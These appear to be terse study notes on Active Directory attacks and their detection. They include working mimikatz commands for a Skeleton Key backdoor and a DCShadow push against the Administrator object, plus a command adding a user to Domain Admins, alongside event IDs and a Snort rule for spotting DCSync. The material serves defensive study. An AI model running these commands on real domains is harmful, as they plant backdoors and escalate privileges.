Skeleton Key - RC4 only - backdoor in memory - mimikatz pw is mimikatz 
    mimikatz#   misc::skeleton

DCShadow - need Domain Admin - temp register wks as DC.  Can update DC with no logs (log should be generated on source DC which is us)
	mimikatz#  lsadump::dcshadow /object:CN=Administrator,CN-User,DC=SYNCTECH,DC=COM /attribute:description /value:"DCShadow was here"
	mimikatz# lsadump::dcshadow /push

Domain Detection
	net group "Domain Admins" bob /domain /add
	EventID 4728 shows who added user to Domain Admin

Detecting Skeleton Key	
	https://gallery.technet.microsoft.com/Aorato-Skeleton-Key-24e46b73

Detecting Golden Ticket
	klist - long validity time 
	EventID 4769

Detecting DCSync
	DRSUAPI  - MS-DRSR  
	Should not be between workstation and DC

Detecting DCShadow
	EventID 5137 and then 5141  (created and deleted directory service object)
	github/AlsidOfficial/UncoverDCShadow/blob/master/README.md
  
  alert tcp any any -> any any (msg:"Mimikatz DRSUAPI DsGetNCChanges Request"; flow:established,to_server; flowbits:isset,drsuapi; content:"|05 00 00|"; depth:3; content:"|00 03|"; offset:22 depth:2; reference:url,blog.didierstevens.com; classtype:policy-violation; sid:1000002; rev:1;)

Detect Exfil
	EventID 5140 failures (network share accessed)
  
  
